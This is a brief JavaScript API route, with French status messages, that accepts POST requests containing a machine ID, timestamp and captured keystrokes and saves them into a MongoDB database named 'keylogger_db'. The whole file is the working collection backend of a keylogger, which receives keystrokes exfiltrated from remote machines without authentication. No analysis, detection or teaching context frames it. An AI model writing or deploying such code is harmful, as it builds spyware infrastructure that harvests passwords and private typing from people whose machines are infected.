import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Méthode non autorisée' });
    }

    try {
        const client = await MongoClient.connect(uri);
        const db = client.db('keylogger_db');
        const collection = db.collection('keystrokes');

        const { machine_id, timestamp, keystrokes } = req.body;

        await collection.insertOne({
            machine_id,
            timestamp,
            keystrokes,
            created_at: new Date()
        });

        await client.close();

        res.status(200).json({ message: 'Données enregistrées avec succès' });
    } catch (error) {
        res.status(500).json({ message: 'Erreur serveur', error: error.message });
    }
} 